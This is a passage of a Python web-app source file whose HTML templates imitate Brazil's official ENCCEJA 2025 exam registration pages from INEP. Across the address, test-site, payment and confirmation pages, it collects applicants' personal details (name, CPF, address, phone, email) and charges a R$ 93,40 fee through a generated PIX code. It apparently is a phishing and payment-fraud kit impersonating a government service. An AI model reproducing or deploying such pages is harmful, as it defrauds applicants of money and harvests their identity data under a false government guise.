    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #2563eb; color: white; }
        .form-footer { background-color: #3b82f6; color: white; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Headers iguais -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#"><img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" /></a>
        </div>
    </header>
    
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z"/>
            </svg>
        </div>
    </div>
    
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <div class="border border-gray-300 rounded">
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">Dados de Endereço - {{ user_data.nome }}</h2>
                </div>
                
                <form method="POST" class="p-6">
                    <div class="grid md:grid-cols-3 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">CEP *</label>
                            <input type="text" name="cep" class="w-full border border-gray-300 p-2 rounded" placeholder="00000-000" required>
                        </div>
                        <div class="md:col-span-2">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Logradouro *</label>
                            <input type="text" name="logradouro" class="w-full border border-gray-300 p-2 rounded" placeholder="Rua, Avenida, etc." required>
                        </div>
                    </div>
                    
                    <div class="grid md:grid-cols-3 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Número *</label>
                            <input type="text" name="numero" class="w-full border border-gray-300 p-2 rounded" placeholder="123" required>
                        </div>
                        <div class="md:col-span-2">
                            <label class="block text-sm font-medium text-gray-700 mb-1">Complemento</label>
                            <input type="text" name="complemento" class="w-full border border-gray-300 p-2 rounded" placeholder="Apt, Bloco, etc.">
                        </div>
                    </div>
                    
                    <div class="grid md:grid-cols-2 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Bairro *</label>
                            <input type="text" name="bairro" class="w-full border border-gray-300 p-2 rounded" placeholder="Nome do bairro" required>
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Cidade *</label>
                            <input type="text" name="cidade" class="w-full border border-gray-300 p-2 rounded" placeholder="Nome da cidade" required>
                        </div>
                    </div>
                    
                    <div class="mb-4">
                        <label class="block text-sm font-medium text-gray-700 mb-1">Estado *</label>
                        <select name="estado" class="w-full border border-gray-300 p-2 rounded" required>
                            <option value="">Selecione o estado</option>
                            <option value="AC">Acre</option>
                            <option value="AL">Alagoas</option>
                            <option value="AP">Amapá</option>
                            <option value="AM">Amazonas</option>
                            <option value="BA">Bahia</option>
                            <option value="CE">Ceará</option>
                            <option value="DF">Distrito Federal</option>
                            <option value="ES">Espírito Santo</option>
                            <option value="GO">Goiás</option>
                            <option value="MA">Maranhão</option>
                            <option value="MT">Mato Grosso</option>
                            <option value="MS">Mato Grosso do Sul</option>
                            <option value="MG">Minas Gerais</option>
                            <option value="PA">Pará</option>
                            <option value="PB">Paraíba</option>
                            <option value="PR">Paraná</option>
                            <option value="PE">Pernambuco</option>
                            <option value="PI">Piauí</option>
                            <option value="RJ">Rio de Janeiro</option>
                            <option value="RN">Rio Grande do Norte</option>
                            <option value="RS">Rio Grande do Sul</option>
                            <option value="RO">Rondônia</option>
                            <option value="RR">Roraima</option>
                            <option value="SC">Santa Catarina</option>
                            <option value="SP">São Paulo</option>
                            <option value="SE">Sergipe</option>
                            <option value="TO">Tocantins</option>
                        </select>
                    </div>
                    
                    <div class="border-t border-gray-300 mt-6">
                        <div class="form-footer p-0 flex justify-center items-center mt-4">
                            <button type="submit" class="flex items-center justify-center w-full py-3 bg-blue-600 text-white rounded hover:bg-blue-700">
                                <i class="fas fa-arrow-right mr-2"></i>
                                <span>Continuar</span>
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </main>
</body>
</html>
'''

LOCAL_PROVA_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Local de Prova - ENCCEJA 2025</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #2563eb; color: white; }
        .form-footer { background-color: #3b82f6; color: white; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Headers iguais -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#"><img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" /></a>
        </div>
    </header>
    
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z"/>
            </svg>
        </div>
    </div>
    
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <div class="border border-gray-300 rounded">
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">Seleção do Local de Prova - {{ user_data.nome }}</h2>
                </div>
                
                <form method="POST" class="p-6">
                    <div class="mb-6">
                        <div class="bg-blue-50 border-l-4 border-blue-400 p-4 mb-4">
                            <div class="flex">
                                <div class="flex-shrink-0">
                                    <i class="fas fa-info-circle text-blue-400"></i>
                                </div>
                                <div class="ml-3">
                                    <p class="text-sm text-blue-700">
                                        <strong>Importante:</strong> Selecione o local de prova mais próximo do seu endereço. 
                                        A disponibilidade de vagas pode variar conforme a demanda.
                                    </p>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div class="grid md:grid-cols-2 gap-4 mb-4">
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Estado da Prova *</label>
                            <select name="estado_prova" class="w-full border border-gray-300 p-2 rounded" required>
                                <option value="">Selecione o estado</option>
                                <option value="SP">São Paulo</option>
                                <option value="RJ">Rio de Janeiro</option>
                                <option value="MG">Minas Gerais</option>
                                <option value="BA">Bahia</option>
                                <option value="PR">Paraná</option>
                                <option value="RS">Rio Grande do Sul</option>
                                <option value="PE">Pernambuco</option>
                                <option value="CE">Ceará</option>
                                <option value="PA">Pará</option>
                                <option value="SC">Santa Catarina</option>
                                <!-- Outros estados -->
                            </select>
                        </div>
                        <div>
                            <label class="block text-sm font-medium text-gray-700 mb-1">Cidade da Prova *</label>
                            <input type="text" name="cidade_prova" class="w-full border border-gray-300 p-2 rounded" placeholder="Digite a cidade" required>
                        </div>
                    </div>
                    
                    <div class="mb-4">
                        <label class="block text-sm font-medium text-gray-700 mb-1">Local de Prova *</label>
                        <select name="local_prova" class="w-full border border-gray-300 p-2 rounded" required>
                            <option value="">Selecione o local de prova</option>
                            <option value="Escola Estadual Centro">Escola Estadual Centro</option>
                            <option value="ETEC Prof. Basilides de Godoy">ETEC Prof. Basilides de Godoy</option>
                            <option value="Colégio Municipal São José">Colégio Municipal São José</option>
                            <option value="Centro de Educação Profissional">Centro de Educação Profissional</option>
                            <option value="Escola Técnica Estadual">Escola Técnica Estadual</option>
                        </select>
                    </div>
                    
                    <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <i class="fas fa-exclamation-triangle text-yellow-400"></i>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-yellow-700">
                                    <strong>Atenção:</strong> Após a confirmação da inscrição, não será possível alterar o local de prova. 
                                    Certifique-se de que conseguirá comparecer no local selecionado.
                                </p>
                            </div>
                        </div>
                    </div>
                    
                    <div class="border-t border-gray-300 mt-6">
                        <div class="form-footer p-0 flex justify-center items-center mt-4">
                            <button type="submit" class="flex items-center justify-center w-full py-3 bg-blue-600 text-white rounded hover:bg-blue-700">
                                <i class="fas fa-credit-card mr-2"></i>
                                <span>Ir para Pagamento</span>
                            </button>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    </main>
</body>
</html>
'''

PAGAMENTO_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento - ENCCEJA 2025</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #2563eb; color: white; }
        .form-footer { background-color: #3b82f6; color: white; }
        .pix-container { background-color: #f0f9ff; border: 2px dashed #0ea5e9; }
    </style>
    <script>
        function gerarPIX() {
            const button = document.getElementById('gerar-pix-btn');
            const loadingDiv = document.getElementById('loading-pix');
            const pixContainer = document.getElementById('pix-container');
            
            button.disabled = true;
            button.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i>Gerando PIX...';
            loadingDiv.classList.remove('hidden');
            
            fetch('/criar-pagamento-pix', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({})
            })
            .then(response => response.json())
            .then(data => {
                loadingDiv.classList.add('hidden');
                
                if (data.success) {
                    pixContainer.innerHTML = `
                        <div class="text-center">
                            <h3 class="text-lg font-bold text-green-800 mb-4">
                                <i class="fas fa-check-circle mr-2"></i>
                                PIX Gerado com Sucesso!
                            </h3>
                            <div class="bg-white p-4 rounded-lg border mb-4">
                                <p class="text-sm text-gray-600 mb-2">Código PIX Copia e Cola:</p>
                                <div class="bg-gray-100 p-3 rounded text-xs font-mono break-all">
                                    ${data.pixCode}
                                </div>
                                <button onclick="copiarPIX('${data.pixCode}')" class="mt-2 bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700">
                                    <i class="fas fa-copy mr-1"></i> Copiar Código PIX
                                </button>
                            </div>
                            <div class="text-center">
                                <p class="text-lg font-bold text-gray-800">Valor: R$ ${data.amount.toFixed(2)}</p>
                                <p class="text-sm text-gray-600">Transação: ${data.transactionId}</p>
                            </div>
                            <div class="mt-4">
                                <button onclick="window.location.href='/inscricao-sucesso'" class="bg-green-600 text-white px-6 py-3 rounded hover:bg-green-700">
                                    <i class="fas fa-check mr-2"></i>
                                    Confirmar Pagamento
                                </button>
                            </div>
                        </div>
                    `;
                } else {
                    pixContainer.innerHTML = `
                        <div class="text-center text-red-600">
                            <i class="fas fa-exclamation-triangle text-2xl mb-2"></i>
                            <p>Erro ao gerar PIX: ${data.error}</p>
                            <button onclick="gerarPIX()" class="mt-2 bg-blue-600 text-white px-4 py-2 rounded">
                                Tentar Novamente
                            </button>
                        </div>
                    `;
                }
            })
            .catch(error => {
                loadingDiv.classList.add('hidden');
                pixContainer.innerHTML = `
                    <div class="text-center text-red-600">
                        <i class="fas fa-exclamation-triangle text-2xl mb-2"></i>
                        <p>Erro de conexão. Tente novamente.</p>
                        <button onclick="gerarPIX()" class="mt-2 bg-blue-600 text-white px-4 py-2 rounded">
                            Tentar Novamente
                        </button>
                    </div>
                `;
            });
        }
        
        function copiarPIX(codigo) {
            navigator.clipboard.writeText(codigo).then(() => {
                alert('Código PIX copiado para a área de transferência!');
            });
        }
    </script>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Headers iguais -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#"><img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" /></a>
        </div>
    </header>
    
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z"/>
            </svg>
        </div>
    </div>
    
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <div class="border border-gray-300 rounded">
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">Pagamento da Taxa de Inscrição - R$ 93,40</h2>
                </div>
                
                <div class="p-6">
                    <div class="bg-blue-50 border-l-4 border-blue-400 p-4 mb-6">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <i class="fas fa-info-circle text-blue-400"></i>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-blue-700">
                                    <strong>Candidato:</strong> {{ user_data.nome }}<br>
                                    <strong>CPF:</strong> {{ user_data.cpf }}<br>
                                    <strong>Valor da Taxa:</strong> R$ 93,40
                                </p>
                            </div>
                        </div>
                    </div>
                    
                    <div class="text-center mb-6">
                        <button id="gerar-pix-btn" onclick="gerarPIX()" class="bg-green-600 text-white px-8 py-4 rounded-lg text-lg hover:bg-green-700">
                            <i class="fas fa-qrcode mr-2"></i>
                            Gerar PIX para Pagamento
                        </button>
                    </div>
                    
                    <div id="loading-pix" class="hidden text-center py-8">
                        <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600"></div>
                        <p class="mt-2 text-gray-600">Gerando código PIX...</p>
                    </div>
                    
                    <div id="pix-container" class="pix-container p-6 rounded-lg text-center">
                        <i class="fas fa-qrcode text-4xl text-gray-400 mb-4"></i>
                        <p class="text-gray-600">Clique no botão acima para gerar o código PIX</p>
                    </div>
                    
                    <div class="mt-6 text-sm text-gray-600">
                        <h4 class="font-bold mb-2">Instruções:</h4>
                        <ul class="list-disc list-inside space-y-1">
                            <li>Abra o aplicativo do seu banco</li>
                            <li>Procure a opção PIX</li>
                            <li>Escolha "Pagar com Código" ou "PIX Copia e Cola"</li>
                            <li>Cole o código gerado acima</li>
                            <li>Confirme o pagamento de R$ 93,40</li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </main>
</body>
</html>
'''

INSCRICAO_SUCESSO_TEMPLATE = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inscrição Realizada - ENCCEJA 2025</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .gov-header { background: linear-gradient(90deg, #1e3a8a 0%, #3b82f6 100%); }
        .inep-header { background-color: #f3f4f6; }
        .form-header { background-color: #16a34a; color: white; }
        .success-box { background-color: #f0fdf4; border: 2px solid #16a34a; }
    </style>
</head>
<body class="flex flex-col min-h-screen">
    <!-- Headers iguais -->
    <header class="gov-header text-white py-2">
        <div class="container mx-auto flex justify-between items-center px-4">
            <a class="font-bold text-sm" href="#"><img src="https://i.ibb.co/TDkn2RR4/Imagem-29-03-2025-a-s-17-32.jpg" alt="Logotipo" class="h-6" /></a>
        </div>
    </header>
    
    <div class="inep-header py-3">
        <div class="container mx-auto px-4">
            <svg class="h-7" height="30" preserveAspectRatio="xMidYMid" viewBox="0 0 69 20" width="120" xmlns="http://www.w3.org/2000/svg">
                <defs><style>.cls-2{fill:#333}</style></defs>
                <path class="cls-2" d="M30 20h17v-5H35v-3h12V7H30v13zM50 0v5h19c0-2.47-2.108-5-5-5M50 20h6v-8h8c2.892 0 5-2.53 5-5H50v13zM22 0H9v5h18c-.386-4.118-4.107-5-5-5zm8 5h17V0H30v5zM0 20h6V7H0v13zm9 0h6V7H9v13zm12 0h6V7h-6v13zM0 5h6V0H0v5z"/>
            </svg>
        </div>
    </div>
    
    <main class="flex-grow py-8">
        <div class="container mx-auto px-4 max-w-3xl">
            <div class="text-center mb-6">
                <img alt="Logo ENCCEJA 2025" class="mx-auto" height="100" src="https://enccejanacional.inep.gov.br/encceja/images/Logo-Encceja2025.png" width="420"/>
            </div>
            
            <div class="border border-green-500 rounded">
                <div class="form-header py-2 px-4 text-center">
                    <h2 class="text-lg">
                        <i class="fas fa-check-circle mr-2"></i>
                        Inscrição Realizada com Sucesso!
                    </h2>
                </div>
                
                <div class="p-6">
                    <div class="success-box p-6 rounded-lg text-center mb-6">
                        <i class="fas fa-graduation-cap text-6xl text-green-600 mb-4"></i>
                        <h3 class="text-xl font-bold text-green-800 mb-2">
                            Parabéns, {{ user_data.nome }}!
                        </h3>
                        <p class="text-green-700">
                            Sua inscrição no ENCCEJA 2025 foi realizada com sucesso.
                        </p>
                    </div>
                    
                    <div class="grid md:grid-cols-2 gap-6 mb-6">
                        <div class="bg-blue-50 p-4 rounded-lg">
                            <h4 class="font-bold text-blue-800 mb-2">
                                <i class="fas fa-user mr-2"></i>
                                Dados da Inscrição
                            </h4>
                            <p class="text-sm text-blue-700">
                                <strong>Nome:</strong> {{ user_data.nome }}<br>
                                <strong>CPF:</strong> {{ user_data.cpf }}<br>
                                <strong>Telefone:</strong> {{ user_data.telefone }}<br>
                                <strong>E-mail:</strong> {{ user_data.email }}
                            </p>
                        </div>
                        
                        <div class="bg-green-50 p-4 rounded-lg">
                            <h4 class="font-bold text-green-800 mb-2">
                                <i class="fas fa-calendar mr-2"></i>
                                Próximos Passos
                            </h4>
                            <ul class="text-sm text-green-700 space-y-1">
                                <li>• Aguarde a confirmação por e-mail</li>
                                <li>• Cartão de confirmação: Maio 2025</li>
                                <li>• Data da prova: 25 de Maio de 2025</li>
                                <li>• Resultados: Julho de 2025</li>
                            </ul>
                        </div>
                    </div>
                    
                    <div class="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
                        <div class="flex">
                            <div class="flex-shrink-0">
                                <i class="fas fa-exclamation-triangle text-yellow-400"></i>
                            </div>
                            <div class="ml-3">
                                <p class="text-sm text-yellow-700">
                                    <strong>Importante:</strong> Guarde este comprovante. Você receberá mais informações 
                                    sobre local e horário da prova por e-mail e também poderá consultar no site oficial do INEP.
                                </p>
                            </div>
                        </div>
                    </div>
                    
                    <div class="text-center">
                        <a href="/" class="bg-blue-600 text-white px-6 py-3 rounded-lg hover:bg-blue-700 mr-4">
                            <i class="fas fa-home mr-2"></i>
                            Voltar ao Início
                        </a>
                        <button onclick="window.print()" class="bg-gray-600 text-white px-6 py-3 rounded-lg hover:bg-gray-700">
                            <i class="fas fa-print mr-2"></i>
                            Imprimir Comprovante
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </main>
</body>
</html>
'''

if __name__ == '__main__':
    logging.info("[VPS] Iniciando aplicação ENCCEJA 2025 VPS")
    app.run(host='0.0.0.0', port=5000, debug=False)